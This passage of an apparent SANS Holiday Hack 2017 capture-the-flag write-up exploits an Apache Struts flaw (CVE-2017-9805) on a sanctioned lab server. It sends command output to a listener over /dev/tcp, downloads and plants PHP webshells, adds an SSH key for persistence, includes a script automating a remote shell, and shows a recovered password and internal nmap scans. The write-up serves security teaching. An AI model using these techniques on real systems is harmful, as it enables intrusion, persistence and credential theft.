  -u URL      url of target vulnerable apache struts server. Ex-
	      http://somevulnstrutsserver.com/orders.xhtml
  -c COMMAND  command to execute against the target. Ex - /usr/bin/whoami
</pre>

<p>
The example URL is <code>http://somevulnstrutsserver.com/orders.xhtml</code>. How fortituous!
</p>

<pre class="example">
$ python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 'ls'
[+] Encoding Command
[+] Building XML object
[+] Placing command in XML object
[+] Converting Back to String
[+] Making Post Request with our payload
[+] Payload executed
</pre>

<p>
Looks like we need to modify the program to let us see what it's
doing by uncommenting the following line:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b5bd68;">print</span> request.text
</pre>
</div>

<p>
Performing the same simple command above results in a lengthy Apache Tomcat
error with no apparent output from our <code>ls</code> command. We're dealing with a
blind injection so we'll need to figure out a different way to get the output
of the command. One trick we can pull is redirecting output to a special
pseudo device, <code>/dev/tcp/$host/$port</code>. First we'll need to set up a listener
on our end first:
</p>

<pre class="example">
holiday@hack:~$ nc -l -p 8888
</pre>

<p>
Now we run the exploit again:
</p>

<pre class="example">
./cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c "ls &gt; /dev/tcp/1.2.3.4/8888"
</pre>

<p>
The result on our end is:
</p>
<pre class="example">
holiday@hack:~$ nc -l -p 8888
bin
boot
dev
etc
home
...
vmlinuz
vmlinuz.old
</pre>

<p>
It looks like we've been dropped into the root directory. Let's look for
where the web root is. Normally, the default is /var/www/html on most
linux+apache based hosts. We'll try again with the command <code>ls -al /var/www/html</code>.
</p>

<pre class="example">
total 1772
drwxrwxrwt 6 www-data           www-data              4096 Jan  6 03:00 .
drwxr-xr-x 3 root               root                  4096 Oct 12 14:35 ..
drwxr-xr-x 2 root               www-data              4096 Oct 12 19:03 css
drwxr-xr-x 3 root               www-data              4096 Oct 12 19:40 fonts
-r--r--r-- 1 root               www-data           1764298 Dec  4 20:25 GreatBookPage2.pdf
drwxr-xr-x 2 root               www-data              4096 Oct 12 19:14 imgs
-rw-r--r-- 1 root               www-data             14501 Nov 24 20:53 index.html
drwxr-xr-x 2 root               www-data              4096 Oct 12 19:11 js
-rwx------ 1 www-data           www-data               231 Oct 12 21:25 process.php
</pre>

<p>
Oh look. There's <a href="https://l2s.northpolechristmastown.com/GreatBookPage2.pdf">GreatBookPage2.pdf</a>. We can download it and find the answer to the first question.
</p>

<p>
Let's assume for a minute that we didn't know where the web root
was. Since page 1 of our Great Book was a PDF, it's a pretty safe bet
that page 2 is also a PDF. It takes about half of a second to search the system for all PDFs using <code>find</code>:
</p>

<pre class="example">
$ find / -name *.pdf
/var/www/html/GreatBookPage2.pdf
</pre>
</div>

<ul class="org-ul">
<li><a id="org6ffb22f"></a>Command Execution<br />
<div class="outline-text-6" id="text-org6ffb22f">
<p>
It looks like we found our web root. Let's try out the
web shell they suggest in the hints from Josh Wright
<a href="https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/be4b2c021b284f21418f55b9d4496cdd3b3c86d8/easy-simple-php-webshell.php">easy-simple-php-webshell.php</a>.
We'll output it to a random file in the web root then
we can try to use it to execute commands using a browser.
</p>

<pre class="example">
./cve-2017-9805.py -c "wget -O /var/www/html/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php
   https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/be4b2c021b284f21418f55b9d4496cdd3b3c86d8/easy-simple-php-webshell.php"
   -u https://dev.northpolechristmastown.com/orders.xhtml
</pre>

<p>
Now we can access
<a href="https://l2s.northpolechristmastown.com/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php">https://l2s.northpolechristmastown.com/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php</a>
and look around. If we do an <code>ls</code> in this webshell, it just returns
the local directory, <code>/var/www/html</code>. Nothing in here suggests that we
have the webroot for the dev server,
<a href="https://dev.northpolechristmastown.com/">https://dev.northpolechristmastown.com/</a>.
</p>

<p>
Let's run <code>find</code> to see if we can find the password in our webshell.
</p>

<div class="org-src-container">
<pre class="src src-sh">find / -xdev -type f -user alabaster_snowball 2&gt;/dev/null | xargs grep password
</pre>
</div>

<p>
Within the page full of results we see this:
</p>

<pre class="example">
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class: final String password = "stream_unhappy_buy_loss";
</pre>

<p>
A closer look at <code>OrderMySql.class</code> using <code>cat /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class</code> we find:
</p>

<div class="org-src-container">
<pre class="src src-java"><span style="color: #b5bd68;">final</span> <span style="color: #81a2be;">String</span> <span style="color: #f0c674;">username</span> = <span style="color: #8abeb7;">"alabaster_snowball"</span>;
<span style="color: #b5bd68;">final</span> <span style="color: #81a2be;">String</span> <span style="color: #f0c674;">password</span> = <span style="color: #8abeb7;">"stream_unhappy_buy_loss"</span>;
</pre>
</div>
</div>
</li>
</ul>
</div>

<div id="outline-container-org109dea5" class="outline-4">
<h4 id="q2_solution"><a id="org109dea5"></a>Solution</h4>
<div class="outline-text-4" id="text-q2_solution">
</div>

<ul class="org-ul">
<li><a id="org2d46cc4"></a>What is the topic of The Great Book page available in the web root of the server?<br />
<div class="outline-text-6" id="text-org2d46cc4">
<p>
Leveraging the Apache Struts vulnerability, we can run <code>ls</code> on the
common web root of <code>/var/www/html</code>, and get the filename of the page,
then download it via the web server. Opening it up, we see that the
topic is:
</p>

<blockquote>
<p>
On the Topic of Flying Animals
</p>
</blockquote>
</div>
</li>

<li><a id="org94564fa"></a>What is Alabaster Snowball’s password?<br />
<div class="outline-text-6" id="text-org94564fa">
<p>
The trick here is just finding the right file, and the password is in
cleartext in that file. We used <code>find</code> to <code>grep</code> all the files for
"password".
</p>

<blockquote>
<p>
<code>stream_unhappy_buy_loss</code>
</p>
</blockquote>
</div>
</li>
</ul>
</div>

<div id="outline-container-org82f1ba3" class="outline-4">
<h4 id="q2_alternatives"><a id="org82f1ba3"></a>Alternatives</h4>
<div class="outline-text-4" id="text-q2_alternatives">
</div>

<ul class="org-ul">
<li><a id="org5c8b300"></a>Add an authorized_key<br />
<div class="outline-text-6" id="text-org5c8b300">
<p>
One thing you can do if you don't have the password yet is actually
add an ssh key to alabaster's authorized keys file. This is
problematic since you need to know that the username is actually
<code>alabaster_snowball</code> first. Assuming you do, you can run the following
command to add your key to the file.
</p>

<p>
The command we want to run is the following, taking care not to clobber any existing authorized keys:
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b294bb;">cd</span> /home/alabaster_snowball
<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">Make the .ssh directory, if it doesn't exist</span>
mkdir .ssh
<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">ssh is very picky about permissions, so lock this down:</span>
chmod 700 .ssh
<span style="color: #b294bb;">cd</span> .ssh

<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">Create the authorized_keys file, if it doesn't exist</span>
touch authorized_keys
<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">...and lock it down</span>
chmod 600 authorized_keys

<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">Append our key</span>
<span style="color: #b294bb;">echo</span> ssh-rsa <span style="color: #f0c674;">VGhpcyBpcyBub3QgcmVhbGx5IGFuIFJTQSBrZXksIGJ1dCBoZXksIHdobyByZWFsbHkgbG9va3MgYXQgYmFzZTY0IGFueXdheQo</span>= holiday@hack | 
  tee -a /home/alabaster_snowball/.ssh/authorized_keys
</pre>
</div>

<p>
For running this via the Struts exploit, we want this all as a
one-liner. Let's break this up into two parts: first, we'll create the
necessary directory and file, and ensure the permissions are correct,
then we'll add our key:
</p>

<div class="org-src-container">
<pre class="src src-sh">./cve_2017_9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 
  <span style="color: #8abeb7;">'cd /home/alabaster_snowball; mkdir .ssh; chmod 700 .ssh; cd .ssh; touch authorized_keys; chmod 600 authorized_keys'</span>
./cve_2017_9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 
  <span style="color: #8abeb7;">'echo ssh-rsa VGhpcyBpcyBub3QgcmVhbGx5IGFuIFJTQSBrZXksIGJ1dCBoZXksIHdobyByZWFsbHkgbG9va3MgYXQgYmFzZTY0IGFueXdheQo= holiday@hack | tee -a /home/alabaster_snowball/.ssh/authorized_keys'</span>
</pre>
</div>

<p>
Then you can ssh using your private key identity file.
</p>

<pre class="example">
holiday@hack:~$ ssh -i /home/holiday/.ssh/sans_2017 alabaster_snowball@l2s.northpolechristmastown.com
alabaster_snowball@l2s:/tmp/asnow.xq1pCkwT7LUy3iLl0AaBCc7D$ grep -A1 -R / -e alabaster_snowball
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class: final String username = "alabaster_snowball";
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class- final String password = "stream_unhappy_buy_loss";
</pre>

<p>
Once in you are in a restricted shell but you can try to grep for
alabaster's password but a regular grep against the entire system will
take about 1 minute then you have to parse through the results.
</p>
</div>
</li>

<li><a id="org9f380fb"></a>Automate the webshell<br />
<div class="outline-text-6" id="text-org9f380fb">
<p>
We can automate dropping a webshell and creating a mini shell to query
it. Assuming we have <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a> in
the same directory we can create a script to automate exploitation and
give us a prompt to execute commands.
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/usr/bin/env python</span>
<span style="color: #b5bd68;">from</span> __future__ <span style="color: #b5bd68;">import</span> print_function

<span style="color: #b5bd68;">import</span> base64
<span style="color: #b5bd68;">import</span> requests
<span style="color: #b5bd68;">import</span> sys

<span style="color: #b5bd68;">from</span> cve_2017_9805 <span style="color: #b5bd68;">import</span> main <span style="color: #b5bd68;">as</span> struts_exploit

<span style="color: #f0c674;">VULNERABLE_ENDPOINT</span> = <span style="color: #8abeb7;">"https://dev.northpolechristmastown.com/orders.xhtml"</span>
<span style="color: #f0c674;">BASE_URL</span> = <span style="color: #8abeb7;">"https://l2s.northpolechristmastown.com/"</span>
<span style="color: #f0c674;">WEBSHELL</span> = <span style="color: #8abeb7;">"4beadb1e-5ddb-4636-98a4-c2dac0f79ab3.php"</span>
<span style="color: #f0c674;">WEBSHELL_PAYLOAD</span> = b<span style="color: #8abeb7;">'&lt;?php system($_GET[cmd]); ?&gt;\n'</span>
<span style="color: #f0c674;">WEBSHELL_PAYLOAD_ENCODED</span> = base64.encodestring(WEBSHELL_PAYLOAD).strip()

<span style="color: #969896; font-style: italic;">## </span><span style="color: #969896; font-style: italic;">Emulate this command:</span>
<span style="color: #969896; font-style: italic;">## </span><span style="color: #969896; font-style: italic;">/cve-2017-9805.py -c 'echo PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo= | </span>
<span style="color: #969896; font-style: italic;">##    </span><span style="color: #969896; font-style: italic;">base64 -d &gt; /var/www/html/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php' -u https://dev.northpolechristmastown.com/orders.xhtml</span>
<span style="color: #f0c674;">EXPLOIT_COMMAND</span> = <span style="color: #8abeb7;">"echo {} | base64 -d &gt; /var/www/html/{}"</span>.<span style="color: #b294bb;">format</span>(WEBSHELL_PAYLOAD_ENCODED, WEBSHELL)

<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">run_command</span>(command):
    <span style="color: #f0c674;">url</span> = BASE_URL + WEBSHELL
    <span style="color: #f0c674;">request</span> = requests.get(url, params={<span style="color: #8abeb7;">"cmd"</span>:command})
    <span style="color: #b5bd68;">if</span> request.status_code == 404:
        <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">None</span>
    <span style="color: #b5bd68;">return</span> request.text

<span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">Main function</span>
<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">setup</span>():
    <span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">See if we can run the id command, and if so, we are good to go...</span>
    <span style="color: #f0c674;">out</span> = run_command(<span style="color: #8abeb7;">'id'</span>)
    <span style="color: #b5bd68;">if</span> out <span style="color: #b5bd68;">and</span> <span style="color: #8abeb7;">'uid='</span> <span style="color: #b5bd68;">in</span> out:
        <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">True</span>
    sys.stderr.write(<span style="color: #8abeb7;">"The webshell did not exist, re-exploiting.....\n"</span>)
    struts_exploit(VULNERABLE_ENDPOINT, EXPLOIT_COMMAND)
    <span style="color: #f0c674;">out</span> = run_command(<span style="color: #8abeb7;">'id'</span>)
    <span style="color: #b5bd68;">if</span> out <span style="color: #b5bd68;">and</span> <span style="color: #8abeb7;">'uid='</span> <span style="color: #b5bd68;">in</span> out:
        <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">True</span>
    sys.stderr.write(<span style="color: #8abeb7;">"The struts exploit/webshell failed :-(\n"</span>)
    sys.<span style="color: #81a2be;">exit</span>(1)

<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">interactive</span>():
    setup()
    <span style="color: #b5bd68;">while</span> <span style="color: #81a2be;">True</span>:
        <span style="color: #b5bd68;">try</span>:
            <span style="color: #f0c674;">cmd</span> = <span style="color: #b294bb;">raw_input</span>(<span style="color: #8abeb7;">"www-data@l2s:$ "</span>)
        <span style="color: #b5bd68;">except</span> <span style="color: #81a2be;">EOFError</span>:
            <span style="color: #b5bd68;">print</span>()
            <span style="color: #b5bd68;">return</span>
        <span style="color: #b5bd68;">print</span>(run_command(cmd))

<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">one_shot</span>(command):
    setup()
    <span style="color: #b5bd68;">print</span>(run_command(command))

<span style="color: #b5bd68;">if</span> <span style="color: #b294bb;">__name__</span> == <span style="color: #8abeb7;">"__main__"</span>:
    <span style="color: #b5bd68;">if</span> sys.argv[1:]:
        one_shot(<span style="color: #8abeb7;">' '</span>.join(sys.argv[1:]))
    <span style="color: #b5bd68;">else</span>:
        interactive()
</pre>
</div>

<p>
First we need to either rename <code>cve-2017-9805.py</code> to
<code>cve_2017_9805.py</code> or create a symlink so it can be properly imported
into our script. Then we can easily execute commands on l2s.
</p>

<pre class="example">
holiday@hack:~$ ./l2s.py id
The webshell did not exist, re-exploiting.....
[+] Encoding Command
[+] Building XML object
[+] Placing command in XML object
[+] Converting Back to String
[+] Making Post Request with our payload
[+] Payload executed
uid=33(www-data) gid=33(www-data) groups=33(www-data)

holiday@hack:~$ ./l2s.py uname -a
Linux hhc17-apache-struts1 4.9.0-5-amd64 #1 SMP Debian 4.9.65-3+deb9u2 (2018-01-04) x86_64 GNU/Linux

holiday@hack:~$ ./l2s.py
www-data@l2s:$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@l2s:$ uname -a
Linux hhc17-apache-struts1 4.9.0-5-amd64 #1 SMP Debian 4.9.65-3+deb9u2 (2018-01-04) x86_64 GNU/Linux
</pre>
</div>
</li>

<li><a id="org6377fa4"></a>Search even faster with ripgrep<br />
<div class="outline-text-6" id="text-org6377fa4">
<p>
Ripgrep is a super fast grep replacement written in rust. It does a
better job at filtering binary files, so we can run this command that
finishes in about a second.
</p>

<p>
The following steps create a folder for ripgrep and executes the
search.
</p>

<div class="org-src-container">
<pre class="src src-sh">www-data@l2s:$ mkdir /tmp/.rg
www-data@l2s:$ wget -q -O - https://github.com/BurntSushi/ripgrep/releases/download/0.7.1/ripgrep-0.7.1-x86_64-unknown-linux-musl.tar.gz | 
  tar xzf - -C /tmp/.rg/
www-data@l2s:$ find / -type f -xdev -user alabaster_snowball 2&gt;/dev/null | 
  xargs /tmp/.rg/ripgrep-0.7.1-x86_64-unknown-linux-musl/rg alabaster -A 1
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class: final String username = <span style="color: #8abeb7;">"alabaster_snowball"</span>;
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class- final String password = <span style="color: #8abeb7;">"stream_unhappy_buy_loss"</span>;
</pre>
</div>
</div>
</li>
</ul>
</div>

<div id="outline-container-org6ffe315" class="outline-4">
<h4 id="q2_common-pitfalls"><a id="org6ffe315"></a>Common Pitfalls</h4>
<div class="outline-text-4" id="text-q2_common-pitfalls">
<p>
A common pitfall is the blind injection aspect of the Apache Struts exploit. There were a couple of ways around this:
</p>

<ul class="org-ul">
<li>Using the <code>/dev/tcp</code> trick like we did,</li>
<li>Redirect the output to <code>/var/www/html/$filename</code>, and then accessing that via the web interface,</li>
<li>Piping the output to <code>netcat</code>.</li>
</ul>

<p>
Finding the password was also tricky. Luckily, there weren't many
files on this system, so we could just <code>grep</code> everything, but another
option would've been to look for files that had been modified around
the time the system was installed.
</p>
</div>
</div>

<div id="outline-container-org67f26f6" class="outline-4">
<h4 id="q2_about-the-challenge"><a id="org67f26f6"></a>About the Challenge</h4>
<div class="outline-text-4" id="text-q2_about-the-challenge">
<p>
Initially the host has a couple of noticeable holes.
</p>

<ul class="org-ul">
<li>Apache server running as alabaster (eventually changed to www-data user)</li>
<li>Easy bypass of rbash by adding the '-t' flag and executing bash on ssh login (eventually rbash was forced through sshd_config)</li>
</ul>

<p>
The server itself housed two virtual web hosts, the Letter's to Santa application which ran PHP in nginx and the Development site which was run by Apache struts on a high port being redirected by nginx.
</p>
</div>
</div>

<div id="outline-container-org3d17a46" class="outline-4">
<h4 id="org3d17a46">Moving Foward</h4>
<div class="outline-text-4" id="text-org3d17a46">
<p>
Now that we have a script to automate access to l2s let's run nmap to scan the internal network.
</p>

<pre class="example">
holiday@hack:~$ ./l2s.py "nmap -sC 10.142.0.*"

Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-09 20:51 UTC
Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
Host is up (0.00018s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey:
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp   open  http
|_http-title: Did not follow redirect to https://hhc17-l2s-proxy.c.holidayhack2017.internal/
443/tcp  open  https
|_http-title: Toys List
| ssl-cert: Subject: commonName=dev.northpolechristmastown.com
| Subject Alternative Name: DNS:dev.northpolechristmastown.com, DNS:l2s.northpolechristmastown.com
| Not valid before: 2017-11-29T12:54:54
|_Not valid after:  2018-02-27T12:54:54
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
2222/tcp open  EtherNetIP-1

Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
Host is up (0.00017s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey:
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp open  http
|_http-title: Toys List

Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
Host is up (0.00018s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey:
|   2048 a2:c4:67:fe:a2:d9:df:47:02:55:35:1a:f4:1b:b6:02 (RSA)
|_  256 9e:d4:01:d1:71:be:95:90:68:6e:ee:87:28:42:49:8e (ECDSA)
25/tcp   open  smtp
|_smtp-commands: mail.northpolechristmastown.com, PIPELINING, SIZE 10240000, ETRN, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
80/tcp   open  http
| http-robots.txt: 1 disallowed entry
|_/cookie.txt
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
143/tcp  open  imap
|_imap-capabilities: more AUTH=PLAIN capabilities have OK Pre-login AUTH=LOGINA0001 ENABLE listed SASL-IR IDLE post-login LITERAL+ IMAP4rev1 LOGIN-REFERRALS ID
2525/tcp open  ms-v-worlds
3000/tcp open  ppp

Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
Host is up (0.00014s latency).
Not shown: 996 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
| ssh-hostkey:
|   2048 73:de:22:15:7b:53:13:85:a7:a5:8f:10:3a:5d:3b:3f (RSA)
|_  256 f5:d7:f3:5d:dc:7c:73:10:cc:f7:a4:c7:f0:d9:61:0c (ECDSA)
80/tcp   open     http
| http-robots.txt: 1 disallowed entry
|_/dev
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://edb.northpolechristmastown.com/index.html
389/tcp  filtered ldap
8080/tcp open     http-proxy
| http-robots.txt: 1 disallowed entry
|_/dev
|_http-title: Did not follow redirect to http://edb.northpolechristmastown.com/index.html

Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
Host is up (0.00021s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
80/tcp   open  http
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
| ssl-cert: Subject: commonName=hhc17-smb-server
| Not valid before: 2017-11-06T13:46:55
|_Not valid after:  2018-05-08T13:46:55
|_ssl-date: 2018-01-09T20:51:47+00:00; 0s from scanner time.

Host script results:
|_nbstat: NetBIOS name: HHC17-SMB-SERVE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 42:01:0a:8e:00:08 (unknown)
| smb-security-mode:
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
Host is up (0.00021s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey:
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp   open  http
|_http-title: Toys List
4444/tcp open  krb524

Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
Host is up (0.00078s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Index - North Pole Engineering Presents: EaaS!
3389/tcp open  ms-wbt-server
| ssl-cert: Subject: commonName=hhc17-elf-manufacturing
| Not valid before: 2017-11-23T20:53:55
|_Not valid after:  2018-05-25T20:53:55
|_ssl-date: 2018-01-09T20:51:47+00:00; 0s from scanner time.

Post-scan script results:
| clock-skew:
|   0s:
|     10.142.0.13 (eaas.northpolechristmastown.com)
|_    10.142.0.8 (hhc17-emi.c.holidayhack2017.internal)
| ssh-hostkey: Possible duplicate hosts
| Key 256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA) used by:
|   10.142.0.2
|   10.142.0.3
|   10.142.0.11
| Key 2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA) used by:
|   10.142.0.2
|   10.142.0.3
|_  10.142.0.11
Nmap done: 256 IP addresses (7 hosts up) scanned in 14.86 seconds
</pre>
</div>
</div>
</div>
<div id="outline-container-org5b76bc9" class="outline-3">
<h3 id="org5b76bc9">SMB: Windows Fileshare</h3>
<div class="outline-text-3" id="text-org5b76bc9">
</div>
<div id="outline-container-org4dc18cd" class="outline-4">
<h4 id="q3_question"><a id="org4dc18cd"></a>Question</h4>
<div class="outline-text-4" id="text-q3_question">
<p>
The North Pole engineering team uses a Windows SMB server for sharing
documentation and correspondence. Using your access to the Letters to
Santa server, identify and enumerate the SMB file-sharing server.
What is the file server share name?
</p>
</div>
</div>

<div id="outline-container-org4028406" class="outline-4">
<h4 id="q3_background-information"><a id="org4028406"></a>Background Information</h4>
<div class="outline-text-4" id="text-q3_background-information">
<p>
The scope statement calls out systems on 10.142.0.0/24 as being in scope:
</p>

<blockquote>
<p>
SCOPE: For this entire challenge, you are authorized to attack ONLY
the Letters to Santa system at l2s.northpolechristmastown.com AND
other systems on the internal 10.142.0.0/24 network that you access
through the Letters to Santa system.
</p>
</blockquote>

<p>
The question mentions pivoting through the Letters to Santa server (<code>l2s</code>). A commonly used tool for network discovery is <code>nmap</code>, and we can check that it's available on <code>l2s</code>:
</p>

<pre class="example">
alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.VmaV55tqZi5rteO9fXHB3kjM$ nmap -V

Nmap version 7.40 ( https://nmap.org )
Platform: x86_64-pc-linux-gnu
Compiled with: liblua-5.3.3 openssl-1.1.0c libpcre-8.39 libpcap-1.8.1 nmap-libdnet-1.12 ipv6
Compiled without:
Available nsock engines: epoll poll select
</pre>

<p>
There's a great <code>nmap</code> overview available here: <a href="https://nmap.org/book/nmap-overview-and-demos.html">https://nmap.org/book/nmap-overview-and-demos.html</a>
</p>

<p>
We also know that the SMB suite of protocols uses a lot of ports, but 445 is one of the main ones.
</p>

<p>
Blog Posts:
</p>

<p>
This post on the SANS Pen Testing Blog seems relevant, but masscan isn't installed on <code>l2s</code>:
</p>

<ul class="org-ul">
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a></li>
</ul>
</div>
</div>

<div id="outline-container-orgd23aac8" class="outline-4">
<h4 id="q3_goal"><a id="orgd23aac8"></a>Goal</h4>
<div class="outline-text-4" id="text-q3_goal">
<p>
Three separate things:
</p>

<ol class="org-ol">
<li>Identify the SMB server,</li>
<li>Enumerate the shares on it,</li>
<li>Name the file server share.</li>
</ol>
</div>
</div>

<div id="outline-container-org2c5de55" class="outline-4">
<h4 id="q3_approach"><a id="org2c5de55"></a>Approach</h4>
<div class="outline-text-4" id="text-q3_approach">
<p>
Let's follow the <code>nmap</code> overview.
</p>

<blockquote>
<p>
Being the careful type, Felix first starts out with what is known as
an Nmap list scan (-sL option). This feature simply enumerates every
IP address in the given target netblock(s) and does a reverse-DNS
lookup (unless -n was specified) on each. One reason to do this first
is stealth. The names of the hosts can hint at potential
vulnerabilities and allow for a better understanding of the target
network, all without raising alarm bells.
</p>
</blockquote>

<pre class="example">
alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.sjKK74OSjKfIxlr5otQil8yd$ nmap -sL 10.142.0.0/24

Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-08 02:40 UTC
Nmap scan report for 10.142.0.0
Nmap scan report for 10.142.0.1
Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
Nmap scan report for 10.142.0.4
Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
Nmap scan report for 10.142.0.9
Nmap scan report for 10.142.0.10
Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
Nmap scan report for 10.142.0.12
Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
Nmap scan report for 10.142.0.14
Nmap scan report for 10.142.0.15
...
</pre>

<p>
Parsing the results a bit:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-right" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Hostname</th>
<th scope="col" class="org-right">IP</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">hhc17-l2s-proxy</td>
<td class="org-right">10.142.0.2</td>
</tr>

<tr>
<td class="org-left">hhc17-apache-struts1</td>
<td class="org-right">10.142.0.3</td>
</tr>

<tr>
<td class="org-left">mail</td>
<td class="org-right">10.142.0.5</td>
</tr>

<tr>
<td class="org-left">edb</td>
<td class="org-right">10.142.0.6</td>
</tr>

<tr>
<td class="org-left">hhc17-smb-server</td>
<td class="org-right">10.142.0.7</td>
</tr>

<tr>
<td class="org-left">hhc17-emi</td>
<td class="org-right">10.142.0.8</td>
</tr>

<tr>
<td class="org-left">hhc17-apache-struts2</td>
<td class="org-right">10.142.0.11</td>
</tr>

<tr>
<td class="org-left">eaas</td>
<td class="org-right">10.142.0.13</td>
</tr>
</tbody>
</table>

<p>
One of the systems is named <code>hhc17-smb-server</code>. 
</p>

<p>
Continuing with the overview, we can now narrow in on a single IP:
</p>

<pre class="example">
alabaster_snowball@hhc17-apache-struts1:/tmp/asnow.sjKK74OSjKfIxlr5otQil8yd$ nmap -p- -PS445 -A -T4 -oA avatartcpscan-%D 10.142.0.7

Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-08 02:51 UTC
Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
Host is up (0.00040s latency).
Not shown: 65527 filtered ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
